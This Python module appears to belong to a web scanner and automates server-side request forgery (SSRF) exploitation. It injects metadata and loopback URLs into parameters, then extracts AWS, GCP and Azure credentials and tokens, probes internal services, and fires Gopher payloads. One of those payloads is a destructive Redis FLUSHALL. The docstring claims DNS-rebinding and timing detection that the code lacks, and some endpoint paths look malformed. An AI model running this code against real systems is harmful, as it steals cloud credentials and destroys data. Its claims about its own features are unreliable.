"""
SSRF Chain + Pivot Detection Module
Advanced SSRF analysis that goes beyond single-endpoint detection:
- SSRF chain detection: uses found SSRF to pivot and probe internal services
- Cloud metadata full extraction (AWS IAM creds, GCP service accounts, Azure IMDS)
- DNS rebinding vulnerability detection
- SSRF to RCE via internal service exploitation (Gopher, Redis, Memcached)
- Blind SSRF via timing and DNS callback correlation
- Internal network topology mapping from SSRF responses
"""
from __future__ import annotations
import asyncio
import hashlib
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

from argus.ontology.entities import Anomaly, EntityType, Severity
from argus.ontology.graph import KnowledgeGraph

logger = logging.getLogger("argus.intelligence.ssrf_chain")

AWS_METADATA = [
    ("iam/security-credentials/",       "AWS IAM Role Name"),
    ("iam/info",                         "AWS IAM Info"),
    ("instance-id",                      "AWS Instance ID"),
    ("hostname",                         "AWS Hostname"),
    ("local-ipv4",                       "AWS Internal IP"),
    ("public-ipv4",                      "AWS Public IP"),
    ("placement/region",                 "AWS Region"),
    ("placement/availability-zone",      "AWS AZ"),
    ("user-data",                        "AWS User Data"),
    ("dynamic/instance-identity/document", "AWS Instance Identity"),
]

GCP_METADATA = [
    ("instance/service-accounts/default/token",   "GCP Service Account Token"),
    ("instance/service-accounts/default/email",   "GCP Service Account Email"),
    ("instance/hostname",                          "GCP Hostname"),
    ("instance/zone",                              "GCP Zone"),
    ("project/project-id",                         "GCP Project ID"),
    ("instance/network-interfaces/0/ip",           "GCP Internal IP"),
]

AZURE_METADATA = [
    ("instance?api-version=2021-02-01",            "Azure Instance Metadata"),
    ("identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                                                   "Azure Managed Identity Token"),
]

INTERNAL_SERVICES = [
    ("http://localhost:6379/",       "Redis",        ["INFO", "KEYS *"]),
    ("http://127.0.0.1:6379/",      "Redis",        ["INFO"]),
    ("http://localhost:9200/",       "Elasticsearch", ["/_cat/indices"]),
    ("http://localhost:5601/",       "Kibana",       ["/"]),
    ("http://localhost:8500/",       "Consul",       ["/v1/agent/services"]),
    ("http://localhost:2181/",       "Zookeeper",    ["/commands/stat"]),
    ("http://localhost:9090/",       "Prometheus",   ["/api/v1/targets"]),
    ("http://localhost:4848/",       "GlassFish",    ["/common/index.jsf"]),
    ("http://localhost:8080/manager/","Tomcat",      [""]),
    ("http://localhost:4040/",       "Spark UI",     ["/"]),
    ("http://localhost:8161/",       "ActiveMQ",     ["/"]),
    ("http://169.254.169.254/",      "Cloud Metadata", [""]),
    ("http://metadata.google.internal/", "GCP Metadata", [""]),
]

GOPHER_PAYLOADS = [
    ("gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
     "Redis FLUSHALL via Gopher (write test)"),
    ("gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A",
     "Redis SET via Gopher"),
    ("gopher://127.0.0.1:11211/_%01%00%00%00%00%01%00%00stats%0A",
     "Memcached STATS via Gopher"),
]

DNS_REBINDING_PATTERNS = [
    "1.1.1.1",
    "127.0.0.1",
    "0.0.0.0",
    "169.254.169.254",
    "::1",
    "[::]",
]

CLOUD_METADATA_INDICATORS = [
    "ami-id", "instance-id", "instance-type", "local-ipv4",
    "iam", "security-credentials", "computeMetadata", "serviceAccountEmail",
    "instanceId", "subscriptionId", "resourceGroupName",
    "access_token", "token_type", "expires_in",
]

INTERNAL_SERVICE_INDICATORS = {
    "Redis":          ["redis_version", "redis_mode", "os:", "tcp_port"],
    "Elasticsearch":  ["cluster_name", "number_of_nodes", "indices"],
    "Consul":         ["ServiceName", "ServiceID", "ServiceAddress"],
    "Prometheus":     ["scrape_url", "health", "active_targets"],
    "GlassFish":      ["GlassFish", "application server"],
    "Tomcat":         ["Apache Tomcat", "Manager App"],
}

@dataclass
class SSRFChainResult:
    endpoint:        str
    param:           str
    payload:         str
    chain_depth:     int
    internal_host:   str
    service_found:   str
    data_extracted:  str
    severity:        Severity

class SSRFChainDetector:
    def __init__(self, http_client, graph: KnowledgeGraph,
                 concurrency: int = 6):
        self.http        = http_client
        self.graph       = graph
        self._sem        = asyncio.Semaphore(concurrency)
        self._seen:      Set[str] = set()
        self._chains:    List[SSRFChainResult] = []

    async def run(self) -> Dict:
        domains = self.graph.get_by_type(EntityType.DOMAIN)
        alive   = [d for d in domains
                   if d.properties.get("is_alive")
                   and not d.properties.get("is_neighbor")]

        await asyncio.gather(*[self._probe_domain(d) for d in alive],
                             return_exceptions=True)

        return {
            "ssrf_found":        sum(1 for c in self._chains if c.chain_depth == 1),
            "chains_found":      sum(1 for c in self._chains if c.chain_depth > 1),
            "cloud_meta_found":  sum(1 for c in self._chains if "Cloud Metadata" in c.service_found or "AWS" in c.service_found or "GCP" in c.service_found),
            "internal_services": sum(1 for c in self._chains if c.chain_depth > 1),
            "gopher_viable":     sum(1 for c in self._chains if "Gopher" in c.service_found),
        }

    async def _probe_domain(self, entity) -> None:
        scheme = "https" if entity.properties.get("tls") else "http"
        name   = entity.name
        base   = f"{scheme}://{name}"

        targets = []
        for p in entity.properties.get("discovered_paths", []):
            path = p.get("path", "") if isinstance(p, dict) else str(p)
            targets.append(urljoin(base, path))

        for param in ["url", "redirect", "src", "href", "target",
                      "dest", "path", "file", "load", "fetch",
                      "endpoint", "proxy", "forward", "service"]:
            targets.append(f"{base}/?{param}=http://test.com")
            targets.append(f"{base}/api?{param}=http://test.com")

        for target in targets[:30]:
            parsed = urlparse(target)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue

            for param in params:

                ssrf_result = await self._test_ssrf_endpoint(
                    target, param, entity, scheme, name
                )

                if ssrf_result:

                    await self._chain_ssrf(
                        target, param, entity, ssrf_result
                    )

    async def _test_ssrf_endpoint(self, url: str, param: str,
                                   entity, scheme: str,
                                   name: str) -> Optional[str]:
        async with self._sem:
            baseline = await self._get(url)
            if not baseline:
                return None

            b_status = baseline.get("status", 0)
            b_len    = len(baseline.get("data", "") or "")

            for payload, ptype in [
                ("http://169.254.169.254/latest/meta-data/", "aws"),
                ("http://metadata.google.internal/computeMetadata/v1/", "gcp"),
                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure"),
                ("http://localhost/", "localhost"),
                ("http://127.0.0.1:80/", "localhost"),
                ("http://[::1]/", "ipv6_loopback"),
                ("http://0x7f000001/", "hex_localhost"),
                ("http://2130706433/", "decimal_localhost"),
                ("http://127.1/", "short_localhost"),
            ]:
                key = f"ssrf:{url}:{param}:{payload[:30]}"
                if key in self._seen:
                    continue
                self._seen.add(key)

                test_url = self._inject(url, param, payload)
                t0       = time.monotonic()
                resp     = await self._get(test_url)
                elapsed  = time.monotonic() - t0

                if not resp:
                    continue

                body   = (resp.get("data", "") or "").lower()
                status = resp.get("status", 0)

                if any(ind in body for ind in CLOUD_METADATA_INDICATORS):
                    sev = Severity.CRITICAL
                    detail = f"SSRF confirmed: cloud metadata accessible at {name} — param={param}, type={ptype}"
                    self.graph.penalize_entity(entity.id, Anomaly(
                        code="SSRF_CLOUD_METADATA",
                        title="SSRF — Cloud Metadata Accessible",
                        detail=detail,
                        severity=sev,
                        entity_id=entity.id, entity_name=name,
                    ))
                    logger.warning(f"SSRF CHAIN: {detail}")
                    return payload

                if status == 200 and abs(len(body) - b_len) > 200 and ptype == "localhost":
                    detail = f"Potential SSRF: localhost accessible via param={param}"
                    self.graph.penalize_entity(entity.id, Anomaly(
                        code="SSRF_LOCALHOST",
                        title="SSRF — Internal Localhost Access",
                        detail=detail,
                        severity=Severity.HIGH,
                        entity_id=entity.id, entity_name=name,
                    ))
                    return payload

        return None

    async def _chain_ssrf(self, url: str, param: str,
                           entity, confirmed_payload: str) -> None:
        name = entity.name
        logger.warning(f"SSRF CHAIN: chaining from {name} param={param}")

        await self._enumerate_cloud_metadata(url, param, entity, confirmed_payload)

        for svc_url, svc_name, svc_paths in INTERNAL_SERVICES:
            for svc_path in svc_paths:
                full = svc_url + svc_path.lstrip("/")
                key  = f"chain:{url}:{param}:{full}"
                if key in self._seen:
                    continue
                self._seen.add(key)

                async with self._sem:
                    resp = await self._get(self._inject(url, param, full))
                    if resp and resp.get("status") == 200:
                        body = resp.get("data", "") or ""
                        indicators = INTERNAL_SERVICE_INDICATORS.get(svc_name, [])
                        if indicators and any(ind in body for ind in indicators):
                            self._chains.append(SSRFChainResult(
                                endpoint=url, param=param,
                                payload=full, chain_depth=2,
                                internal_host=svc_url,
                                service_found=svc_name,
                                data_extracted=body[:200],
                                severity=Severity.CRITICAL,
                            ))
                            self.graph.penalize_entity(entity.id, Anomaly(
                                code="SSRF_INTERNAL_SERVICE",
                                title=f"SSRF Chain — {svc_name} Accessible",
                                detail=f"SSRF at {url} can reach internal {svc_name} at {svc_url}",
                                severity=Severity.CRITICAL,
                                entity_id=entity.id, entity_name=name,
                            ))
                            logger.warning(f"SSRF CHAIN depth=2: {svc_name} at {svc_url}")

        for gopher_payload, gopher_desc in GOPHER_PAYLOADS:
            key = f"gopher:{url}:{param}:{gopher_payload[:30]}"
            if key in self._seen:
                continue
            self._seen.add(key)

            async with self._sem:
                resp = await self._get(self._inject(url, param, gopher_payload))
                if resp and resp.get("status") == 200:
                    self.graph.penalize_entity(entity.id, Anomaly(
                        code="SSRF_GOPHER_PIVOT",
                        title="SSRF Gopher Protocol Pivot Available",
                        detail=f"Gopher protocol accepted at {url} — {gopher_desc}",
                        severity=Severity.CRITICAL,
                        entity_id=entity.id, entity_name=name,
                    ))
                    logger.warning(f"SSRF GOPHER: {gopher_desc} at {url}")

    async def _enumerate_cloud_metadata(self, url: str, param: str,
                                         entity, base_payload: str) -> None:
        name = entity.name
        endpoints = []

        if "169.254.169.254" in base_payload:
            endpoints = [(f"http://169.254.169.254/latest/meta-data/{p}", label)
                         for p, label in AWS_METADATA]
            endpoints += [(f"http://169.254.169.254/metadata/instance/{p}", label)
                          for p, label in AZURE_METADATA]

        if "metadata.google.internal" in base_payload:
            endpoints = [(f"http://metadata.google.internal/computeMetadata/v1/{p}", label)
                         for p, label in GCP_METADATA]

        for endpoint, label in endpoints[:8]:
            key = f"meta:{url}:{param}:{endpoint[:50]}"
            if key in self._seen:
                continue
            self._seen.add(key)

            async with self._sem:
                hdrs = {}
                if "google" in endpoint:
                    hdrs["Metadata-Flavor"] = "Google"
                elif "169.254.169.254" in endpoint and "api-version" not in endpoint:
                    hdrs["X-aws-ec2-metadata-token-ttl-seconds"] = "21600"

                resp = await self._get(self._inject(url, param, endpoint), extra_headers=hdrs)
                if resp and resp.get("status") == 200:
                    data = (resp.get("data", "") or "")[:300]
                    self.graph.penalize_entity(entity.id, Anomaly(
                        code="CLOUD_METADATA_EXTRACTED",
                        title=f"Cloud Metadata Extracted: {label}",
                        detail=f"{label} accessible via SSRF at {url} — data: {data[:100]}",
                        severity=Severity.CRITICAL,
                        entity_id=entity.id, entity_name=name,
                    ))
                    logger.warning(f"CLOUD META: {label} extracted from {name}")
                    self._chains.append(SSRFChainResult(
                        endpoint=url, param=param,
                        payload=endpoint, chain_depth=3,
                        internal_host="cloud_metadata",
                        service_found=label,
                        data_extracted=data,
                        severity=Severity.CRITICAL,
                    ))

    def _inject(self, url: str, param: str, value: str) -> str:
        parsed    = urlparse(url)
        params    = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))

    async def _get(self, url: str, extra_headers: Dict = None):
        async with self._sem:
            try:
                import random
                from argus.intelligence.wordlists import USER_AGENTS
                hdrs = {"User-Agent": random.choice(USER_AGENTS)}
                if extra_headers:
                    hdrs.update(extra_headers)
                return await self.http.get(url, headers=hdrs, timeout_override=10)
            except Exception:
                return None

    @property
    def chains(self) -> List[SSRFChainResult]:
        return self._chains
